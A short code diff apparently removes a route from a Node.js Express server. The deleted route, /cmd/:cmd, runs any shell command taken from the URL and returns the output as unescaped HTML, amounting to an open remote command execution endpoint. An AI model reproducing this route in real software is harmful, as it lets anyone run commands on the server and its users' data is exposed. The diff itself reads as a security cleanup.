@@ -95,23 +95,6 @@ app.get('/print', async (req, res, next) => {
     })
 })
 
-app.get('/cmd/:cmd', async (req, res, next) => {
-    const { stdout } = await sh(req.params.cmd);
-    const b = `
-        <!DOCTYPE html>
-        <html lang="fr">
-            <head>
-                <meta charset="utf-8" />
-            </head>
-            <body>
-                <p>${stdout}</p>
-            </body>
-        </html>
-    `;
-
-    res.status(200).send(b);
-});
-
 /*
  * 
  * /ROUTES
